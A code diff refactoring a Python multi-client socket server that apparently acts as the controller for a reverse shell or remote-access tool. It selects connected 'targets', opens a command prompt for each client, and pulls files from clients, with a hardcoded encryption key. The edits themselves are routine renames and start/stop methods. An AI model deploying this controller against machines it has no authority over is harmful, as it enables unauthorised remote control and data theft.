@@ -50,9 +50,9 @@ MENU_HELP = """--h | See this Help Message
 
 def read_file(path: str, block_size: int = 32768) -> bytes:
     """ Generator for reading files """
-    with open(path, 'rb') as f:
+    with open(path, 'rb') as rb_file:
         while True:
-            piece = f.read(block_size)
+            piece = rb_file.read(block_size)
             if piece:
                 yield piece
             else:
@@ -92,7 +92,7 @@ def shell_print(data: bytes) -> None:
 _time = lambda: f"{datetime.now()}".replace(':', '-')
 
 
-class Client(object):
+class Client():
     """ Client Connection Object """
 
     def __init__(self, conn: socket.socket, address: list, fernet: Fernet) -> None:
@@ -245,7 +245,7 @@ class Client(object):
         """ Transfer file from Client to Server """
         # returns True/False, None/error
         self.send_json(['RECEIVE_FILE', file_to_transfer])
-        with open(save_as, 'wb') as f:
+        with open(save_as, 'wb') as wb_file:
             while 1:
                 data = self.receive()
                 if data == b'FILE_TRANSFER_ERROR':
@@ -254,7 +254,7 @@ class Client(object):
                 if data == b'FILE_TRANSFER_DONE':
                     self.send(b'RECEIVED')
                     break
-                f.write(data)
+                wb_file.write(data)
                 self.send(b'RECEIVED')
         self.receive()
         return True, None
@@ -388,26 +388,17 @@ class Client(object):
         return tuple(self.recv_json())
 
 
-class MultiServer(object):
+class MultiServer():
     """ Multi-connection Server class """
 
     def __init__(self, port: int, key: bytes) -> None:
         self.host = ''
         self.port = port
         self.socket = None
+        self.thread = None
+        self.event = threading.Event()
         self.fernet = Fernet(key)
         self.clients = []
-
-    def socket_create(self) -> None:
-        """ Create Socket """
-        try:
-            self.socket = socket.socket()
-        except socket.error as msg:
-            error = errors(msg)
-            logging.error(error)
-            sys.exit(error)
-        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        return
 
     def socket_bind(self) -> None:
         """ Bind socket to port and wait for connection from client """
@@ -419,11 +410,10 @@ class MultiServer(object):
             logging.error("Socket binding error: %s", error)
             time.sleep(5)
             self.socket_bind()
-        return
 
-    def accept_connections(self, _print: bool = False) -> None:
-        """ Accepts incoming connections and agrees on a AES key using RSA"""
-        while 1:
+    def accept_connections(self, _print: bool) -> None:
+        """ Accepts incoming connections """
+        while not self.event.is_set():
             try:
                 conn, address = self.socket.accept()
                 conn.setblocking(1)
@@ -435,19 +425,37 @@ class MultiServer(object):
                 self.clients.append(client)
                 if _print:
                     msg = f'Connection has been established: {address[0]} ({address[-1]})'
-                    bar = len(msg)*'-'
-                    print(f'\n{bar}\n{msg}\n{bar}')
+                    lines = len(msg)*'-'
+                    print(f'\n{lines}\n{msg}\n{lines}')
             except Exception as error:
                 logging.debug(errors(error))
 
-    def del_client(self, client: Client) -> None:
+    def start(self) -> None:
+        """ Start the Server """
+
+        self.socket = socket.socket()
+        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+        self.socket_bind()
+
+        self.thread = threading.Thread(target=self.accept_connections, args=(True,))
+        self.thread.daemon = True
+        self.thread.start()
+
+    def stop(self) -> None:
+        """ Stop the server """
+
+        if self.thread.is_alive():
+            self.event.set()
+        self.socket.shutdown(socket.SHUT_RDWR)
+
+    def disconnect(self, client: Client) -> None:
         """ Disconnect client and remove from connection list """
         try:
             self.clients.remove(client)
             client.conn.close()
         except Exception:
             pass
-        return
 
     def refresh_connections(self) -> None:
         """ Refreshes connections """
@@ -457,7 +465,7 @@ class MultiServer(object):
                 client.send_json(['LIST'])
                 client.conn.recv(20480)
             except Exception:
-                self.del_client(client)
+                self.disconnect(client)
 
     def list_connections(self) -> None:
         """ List all connections """
@@ -465,7 +473,6 @@ class MultiServer(object):
         print('----- Clients -----')
         for i, client in enumerate(self.clients):
             print('   '.join(map(str, (i, ) + client.address)))
-        return
 
     def get_target(self, cmd: str) -> Client:
         """ Select target client """
@@ -694,9 +701,9 @@ class MultiServer(object):
     def interface(self, client: Client) -> None:
         """ CLI to Client """
         # returns None
-        ip = client.address[0]
+        ip_address = client.address[0]
         while True:
-            command = input(f'{ip}> ')
+            command = input(f'{ip_address}> ')
             if self.selector(client, command):
                 break
 
@@ -722,7 +729,7 @@ class MultiServer(object):
                             print()
                         except Exception as error:
                             print(f'Connection lost: {errors(error)}')
-                            self.del_client(client)
+                            self.disconnect(client)
                             self.refresh_connections()
                     else:
                         print('Invalid Selection.')
@@ -732,31 +739,14 @@ class MultiServer(object):
                     print("Invalid command: '--h' for help.")
             except (EOFError, KeyboardInterrupt):
                 print('\nShutting down Server...')
+                self.stop()
                 time.sleep(2)
                 break
             except Exception as error:
                 print(errors(error))
 
 
-def accept_conns(server: MultiServer) -> None:
-    """ Function to accept connections """
-    # Returns None
-    server.socket_create()
-    server.socket_bind()
-    server.accept_connections(_print=True)
-    return
-
-
-def accept_thread(server: MultiServer) -> None:
-    """ Runs function to accept connections in thread """
-    # Returns None
-    t = threading.Thread(target=accept_conns, args=(server,))
-    t.daemon = True
-    t.start()
-    return
-
-
 if __name__ == '__main__':
     server = MultiServer(8000, b'QWGlyrAv32oSe_iEwo4SuJro_A_SEc_a8ZFk05Lsvkk=')
-    accept_thread(server)
+    server.start()
     server.menu()
